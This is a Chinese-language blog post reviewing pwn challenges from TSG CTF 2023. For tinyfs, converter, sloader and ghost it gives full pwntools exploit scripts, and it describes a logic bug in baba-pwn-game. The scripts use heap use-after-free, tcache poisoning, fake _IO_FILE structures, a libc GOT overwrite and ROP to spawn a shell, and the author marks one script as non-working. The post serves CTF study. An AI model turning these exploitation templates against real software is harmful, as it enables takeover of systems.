---
date: 2024-12-09 10:29:05
layout: post
title: TSG CTF 2023 复现和总结
subtitle: 
description: >-
    TSG CTF 复现 pwn 时候的一些感悟吧
image: >-
  /assets/img/uploads/autumn.jpg
optimized_image: >-
  /assets/img/uploads/autumn.jpg
category: ctf
tags:
  - TSG CTF
  - SECCON
  - pwn
  - heap exploitation
  - sandbox escape
author: rosayxy 
paginate: true
---
今年 TSG CTF 给了 SECCON 晋级的一个名额，所以感觉还是要准备一下，以下是 pwn 部分的一些刷题笔记    
## tinyfs
菜单题，中间卡了一次，具体来说，是他实现了一个简单的文件系统，是以树的形式维护的    
此外还实现了一个 cache，用绝对路径的directory 会被 cache 起来，然后访问绝对路径的时候也是 如果 cache 中有的话 就直接 cd 进去    
对于删除文件夹操作，只会 free 掉被删文件夹下面的 files 而非 folders，且都不会清指针，此外 subdirectory 的 parent 指针也不会被置空，不会被清 cache    
所以我们可以通过 cd 到一个被删除的文件夹的 subdirectory 再 `cd ..` 从而可以进入被删除文件夹，访问其中被删除的 files 进而 UAF    
做的时候感觉这些点都观察到了，但是没有拼成这种方法（虽然感觉没删除 subdirectory 有点奇怪就是了）    
此外，还有一个点是它 make directory 和 make files 都是可以溢出15字节左右，但是溢出的字符必须是 alphanumeric 在看 writeup 前一直在想&试怎么利用这个点并且感觉非常难利用，所以可能也是思路带偏了    
然后其他就没啥可说了，一开始 leak 是用的没有清空 buffer 的属性，然后最后有 uaf 后直接用 house of apple2 的板子就行了
### exp
```py
from pwn import*
context(arch='amd64',os='linux',log_level='debug')
p=process("./chall")
libc = ELF("./libc-2.37.so")
# heap leak
p.recvuntil("$ ")
p.sendline("mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb")
p.recvuntil("$ ")
p.sendline("ls")
p.recvuntil("b")
heap_leak = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(heap_leak))
heap_base = heap_leak - 0x2a0
print(hex(heap_base))
# libc leak 试一下能不能用 smallbin 来 leak
p.recvuntil("$ ")
p.sendline("mkdir aaa")
p.recvuntil("$ ")
p.sendline("cd aaa")
for i in range(10):
    p.recvuntil("$ ")
    p.sendline("touch a"+str(i))
p.recvuntil("$ ")
p.sendline("mkdir ttt")
p.recvuntil("$ ")
p.sendline("cd ..")
p.recvuntil("$ ")
p.sendline("rm aaa")

for i in range(8):
    p.recvuntil("$ ")
    p.sendline("touch b"+str(i))
    p.recvuntil("$ ")
    p.sendline("cat b"+str(i))

libc_leak = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(libc_leak)) # 0x7f91df45d060 0x7f91df266000
libc_base = libc_leak - 0x45d060+0x266000
print(hex(libc_base))
# **delete 函数 不会 delete subdirectory，同时不会把 parent 指针置空**
# **所以可以通过 cd 到一个被 delete 的 directory 的 subdirectory 然后 cd .. 来造成 UAF**
# 这些现象都是可以观察到 但是串不起来，，

# tcache poisoning
# 我们先在一个 directory 下面创建一个 folder 和两个 file,然后把 directory 删掉
# 接着我们通过上述方法进入 subdirectory 然后 cd ..，然后往其中先 delete 的 file 写 fd 到 IO_list_all 然后打 iofile 就行
p.recvuntil("$ ")
p.sendline("mkdir freedfolder")
p.recvuntil("$ ")
p.sendline("cd freedfolder")
p.recvuntil("$ ")
p.sendline("touch freedfile1") # 后 delete
p.recvuntil("$ ")
p.sendline("touch freedfile2") # 先 delete
p.recvuntil("$ ")
p.sendline("mkdir subdir")
p.recvuntil("$ ")
p.sendline("cd /freedfolder/subdir")
p.recvuntil("$ ")
p.sendline("cd ..")
p.recvuntil("$ ")
p.sendline("cd ..")
p.recvuntil("$ ")
p.sendline("rm freedfolder")
p.recvuntil("$ ")
p.sendline("cd /freedfolder/subdir")
p.recvuntil("$ ")
p.sendline("cd ..")
p.recvuntil("$ ")

p.sendline("mod freedfile1")
p.recvuntil("Write Here > ")
io_list_all = libc_base + libc.sym['_IO_list_all'] - 0x10
io_file_addr = heap_base + 0x1750 # todo
io_file = b"  sh;"
io_file = io_file.ljust(0x20, b"\x00")
io_file += p64(1)+p64(2)
io_file = io_file.ljust(0x48, b"\x00")+p64(0)+p64(io_file_addr+0x100)
io_file = io_file.ljust(0x68, b"\x00")+p64(libc_base+libc.symbols["system"])
io_file = io_file.ljust(0x88, b"\x00")+p64(io_file_addr + 0x48) # todo modify this
io_file = io_file.ljust(0xa0, b"\x00")+p64(io_file_addr)
io_file = io_file.ljust(0xd8, b"\x00")+p64(libc_base + 0x1f3240)+p64(io_file_addr)
payload = p64(io_list_all^(io_file_addr>>12))+p64(0)+io_file+b"\n"
p.send(payload)

p.recvuntil("$ ")
p.sendline("touch v1")
p.recvuntil("$ ")
p.sendline("touch iolistall")
p.recvuntil("$ ")
p.sendline("mod iolistall")
p.recvuntil("Write Here > ")
p.sendline(p64(0)*2+p64(io_file_addr))
p.recvuntil("$ ")
p.sendline("exit")
p.interactive()

```

## converter
converter2 和 converter 一样 盲猜拆了两道题是考配环境 在本地打的能力吧，exp 是一样的，环境不一样但是好像没啥关系   
打了俩小时出了，感觉就是个简单题，主要考察的是函数 `c32rtomb` 的特性，比如当输入转化的值不在 utf-32 范围内会返回 -1，当输入在 0~0x80 的值会原样返回这些。    
此外需要结合 `for (int i=0; utf32_hexstr[q] != 0; i++) {` 这个不对的终止条件，`utf8-bin` 数组向前溢出写 `utf32_hexstr` 数组的第三行，然后使得转化时，`utf8-bin` 数组可以填满，从而把 flag 带出来
有点像去年哈工大的 scanf 题    
### exp
```py
from pwn import*
context(arch='amd64', os='linux', log_level='debug')
p = process('./chall')
gdb.attach(p)
pause()
# utf-32 范围是 0 ~ 0x10ffff
# 0x6334336631303030
p.recvuntil("Q1: What is the code of the rocket emoji in utf32be? (hexstring)> ")
payload = ("dfdfdfdf"*22+"00000030"*3+"00000031"+"00000066"+"00000033"+"00000034"+"00000063")
p.sendline(payload)
p.recvuntil("Q2: What is the code of the fox emoji in utf32be? (hexstring)> ")
p.send("0001f34c"*31)
p.recvuntil("Q3: Guess the flag in utf32be. (hexstring)> ")
p.send("0001f34c"*31)
p.interactive()

```
## sloader
其实不难，自己实现了一个简易 loader 来 load 我们的 chall，然后一些 libc 中的函数进行了 mapping    
然后 chall 中本来有 canary 但是 got 表的 stack_chk_fail 函数导向的是 chall 里面的 `libc_mapping::sloader___stack_chk_fail`，而该函数就直接返回了    
而且 chall 和 sloader 实际上的偏移也是固定的，所以就是一个简单 ROP 可以搞定 ~     
而且发现 scanf 可以读入 \x00 ? 有点长见识了   
最后打出来用的是 one_gadget
### exp
```py
from pwn import *
import time
context(arch='amd64', os='linux', log_level='debug')
p=process(["./sloader","./chall"])

time.sleep(0.1)
# 0x14011b1
p.sendline(b"a"*32+p64(0x1404010)+p64(0x01012C630)) # try one_gadget
p.interactive()
```

## ghost
感觉这个题难一点     
首先漏洞点，之前一直是有越界写的预设，但是没想到最后的问题是 UAF    
主要也是 rust 和 C++ 的 vector 操作都会在删除元素的时候析构掉它，而我们通过它 modify_pinned 的整数下溢，可以使得我们 pinned 的 tweet 的 index 大于 max_index    
注意 rust 的加减法溢出只有在 debug 模式会报错，**所以如果是常规开发想要防止溢出的话 建议用 wrapping_add 和 wrapping_sub**    
然后它 pop 是只能 pop 比 max_index 下标大的元素，所以我们还是可以删除 pinned 的元素，然后 pinned 的 tweet 是可以被输出或者修改的 从而造成 UAF     
然后就是常规操作打 tcache poisoning，但是在 exit 操作的时候会有问题是因为他首先会做 vector 的析构操作，然后在这一步会尝试 free 一个 libc pointer，所以可能会挂掉（除非我们这步可以搞出来一个 house of spirit....）    
然后可以想到的操作是看栈上有没有可以当成 size 的字段，然后改打覆盖返回地址为 ROP chain    
但是看 [writeup](https://ctftime.org/writeup/38179) 用了一个黑魔法    
这个不是打的我们 IO_FILE 的操作，而是写的 libc got 表。然后在 打印 free invalid pointer 的时候会调用到 got 表的 `wcscpy` 函数，且传参是 got 表的起始地址（对而且这次 libc got 表可写）    
所以我们可以覆盖 wcscpy@libc_got 为 system 函数然后覆盖 libc_got 的起始位置为 "/bin/sh\x00" 然后就可以 getshell 了    
但是这个有点难逆出来或者单独调出来，可能需要 mark 一下，当一个板子    
### exp_incomplete
```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
libc = ELF("./libc.so.6")
p=process("./ghost")
def post(content):
    p.sendlineafter(">", "1")
    p.sendafter("tweet > ", content)

def pin(idx):
    p.sendlineafter(">", "3")
    p.sendlineafter("id > ", str(idx))

def modify_pinned(content):
    p.sendlineafter(">", "5")
    p.sendafter("tweet > ", content)

def print_pinned():
    p.sendlineafter("> ", "4")

def undo():
    p.sendlineafter("> ", "2")

def change_pinned_idx(is_newer,offset):
    p.sendlineafter("> ", "6")
    p.sendlineafter("older[0] / newer[1] > ", str(is_newer))
    p.sendlineafter("size > ", str(offset))

post('a'*0x100) # 1
post('b'*0x100) # 2
post('c'*0x100) # 3
post('d'*0x100) # 4
post('e'*0x100) # 5
post('f'*0x100) # 6
post('g'*0x100) # 7
post('h'*0x100) # 8
post('i'*0x100) # 9
post('j'*0x100) # 10
for i in range(8):
    post("i"*0x110)

post('k'*0x10) # 11
pin(2) # max index = 2
change_pinned_idx(0,2**64-1)

for i in range(17):
    undo()
# 0x7f3c88e32000 0x7f3c8904bce0
print_pinned()
# leak heap and libc
libc_and_heap = p.recv(14)
print(libc_and_heap)
libc_leak = u64(libc_and_heap[8:14].ljust(8,b"\x00"))
libc_base = libc_leak - 0x219ce0
heap_leak = u64(libc_and_heap[0:6].ljust(8,b"\x00"))
heap_base = heap_leak - 0x3930
print(hex(libc_base))
print(hex(heap_base))
for i in range(8):
    post('a'*0x110)

for i in range(7):
    post('b'*0x100) # 最后一次正好申请出来我们的堆块

# post fake iofile chunk
io_file_addr = heap_base + 0x2e60+0x10
io_file = b"  sh;"
io_file = io_file.ljust(0x20, b"\x00")
io_file += p64(1)+p64(2)
io_file = io_file.ljust(0x48, b"\x00")+p64(0)+p64(io_file_addr+0x100)
io_file = io_file.ljust(0x68, b"\x00")+p64(libc_base+libc.symbols["system"])
io_file = io_file.ljust(0x88, b"\x00")+p64(io_file_addr + 0x48) # todo modify this
io_file = io_file.ljust(0xa0, b"\x00")+p64(io_file_addr)
io_file = io_file.ljust(0xd8, b"\x00")+p64(libc_base + 0x1f3240)+p64(io_file_addr)
io_file = io_file.ljust(0xf0, b"\x00")
post(p64(0)*2+io_file)
print(hex(libc_base))
print(hex(heap_base))
# change pinned idx 由3到17
change_pinned_idx(0,2**64-14)
undo()
undo()
gdb.attach(p)
pause()
modify_pinned(p64((libc_base+libc.symbols["_IO_list_all"])^((heap_base+0x3830)>>12))+p64(0)) # 0x2e50
# fake iofile
post("a"*0x100)
post((p64(heap_base+0x2e70)).ljust(0x100,b"\x00")) # 只会冲掉 stderr

p.sendlineafter("> ", "7") # 这样 free 会出问题

p.interactive()
```
这个最后打不出来

### exp_dark_magic
```py
# 打函数指针的板子 可以先备下来
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
sc = process("./ghost")
def select(n):
    # sc.after("> ").sendline(str(n))
    sc.sendlineafter("> ", str(n))
def post(data: bytes | str):
    select(1)
    # sc.after("tweet >").sendline(data)
    sc.sendlineafter("tweet > ", data)
def undo():
    select(2)
def pin(id):
    select(3)
    # sc.after("id >").sendline(str(id))
    sc.sendlineafter("id > ", str(id))
def print_pin():
    select(4)
def move_pin(old_new, size):
    select(6)
    # sc.after("older[0]").sendline(str(old_new))
    sc.sendlineafter("older[0] / newer[1] > ", str(old_new))
    # sc.after("size > ").sendline(str(size))
    sc.sendlineafter("size > ", str(size))
def modify_pin(data):
    select(5)
    # sc.after("tweet > ").sendline(data)
    sc.sendlineafter("tweet > ", data)

# libc leak

s1 = 0x108
for i in range(9):
    post(b"a" * s1)

pin(0)
move_pin(0, 2 ** 64 - 2)

for i in range(8):
    undo()

print_pin()
leak = u64(sc.recv(6).ljust(8, b"\x00"))

libc_offset = leak - 0x7ffff7e19ce0
libc_base = 0x00007ffff7c00000 + libc_offset

print(f"{libc_base=:#x}")

# heap leak

for i in range(7):
    post(b"a" * s1)

pin(0)
move_pin(0, 2 ** 64 - 8)

for i in range(7):
    undo()

print_pin()

leak = u64(sc.recv(6).ljust(8, b"\x00"))
mask = leak

# reset

for i in range(7):
    post(b"a" * s1)

pin(0)
move_pin(0, 2 ** 64 - 7)

for i in range(7):
    undo()

print_pin()

leak = u64(sc.recv(6).ljust(8, b"\x00"))
print(f"{leak ^ mask=:#x}")

# tcache poisoning

target = 0x00007ffff7e19000 + libc_offset

modify_pin(p64(target ^ mask))

for i in range(6):
    post(b"a" * s1)

ptrs = [0x30 + i for i in range(s1 // 8)]

ptrs[0x13] = 0x000f2d7a + libc_base
ptrs[0x0c] = 0x00121f5a + libc_base
ptrs[0x18] = 0x00052dd4 + libc_base
ptrs[0x17] = 0x0002a8bb + libc_base
ptrs[0x14] = 0x000de39f + libc_base
ptrs[0x1d] = 0x000c535d + libc_base
ptrs[0x20] = 0x7ffff7c50d70 + libc_offset # system
ptrs[0] = int.from_bytes(b"/bin/sh\0", "little") # 感觉这个有说法 可以 mark 一下
ptrs = b"".join(p64(ptr) for ptr in ptrs)
# gdb.attach(sc)
# pause()
post(ptrs)
select(7)
sc.interactive()
```
这个是 ctf-time 上的同款板子，但是针对 pwntools 做了适配 （ctf-time 的 exp 直接跑会寄掉）   

## baba-pwn-game
好 trick 一个题，主要是逻辑洞，给了一个初始位置的溢出一个往下 push 'O' 或者 '@' 的溢出 然后试了用溢出改逻辑，玩了一会还是不太明白   
感觉还是想不到那么深吧    
> 当关卡名称中输入类似 hard.y\x00...\x00 的内容时，可以从关卡中移出。接下来，可以通过让 * 嵌入到墙中，然后将其变成 SINK，目标是破坏墙壁。    
> 移动 O 和 @，使 S is YOU 生效。    
> 移动 S，使 I is YOU 生效。  
> 用 I 推动 I 进入关卡内部，清理下面大量的 O。  
> 如果不先清理 O 而直接使用 O is YOU，可能会因为嵌入墙壁导致游戏结束。  
> 注意关卡外的 I 和内部的 O 的位置，使用 O 推动 * 到墙壁的通路上，破坏通路中的 X。  
> 激活 O is YOU。  
> 让 O 嵌入到数字 6 前的墙中。  
> 控制关卡外的 I，设置 * is STOP and SINK。    
> 移动关卡内的 O，将嵌入墙中的 * 推入墙中。   
> 由于 SINK 的触发条件是该格子被更新，墙会被破坏。   
> 墙破坏后，可以到达数字 6。   
> 据说可以通过推动 I 达到终点，即使终点前的墙是双层的，也能解开关卡。   
（ref from https://hackmd.io/@jj1dzqGjTTGdLiMP-A-F2A/Skk3yJSma#pwn-BABA-PWN-GAME ）
唉 感觉还是想不到那么深吧   

## 总结
可能和国内的题是给一个原语然后看你怎么利用不同（比如 qwb 某题只给了任意地址 free 原语），这些题感觉都是倾向于找一系列漏洞然后综合去利用    
所以可能更需要注意两个方面：
- 在感觉卡思路（特别是像感觉现有条件基本都做不出来）的情况下，一定看看是不是有洞没找到    
- 给源码的题一定要注意一些会报错的条件是什么（比如说 baba-pwn-game 里面的 "you lose" 的条件 然后想一下怎么绕过）    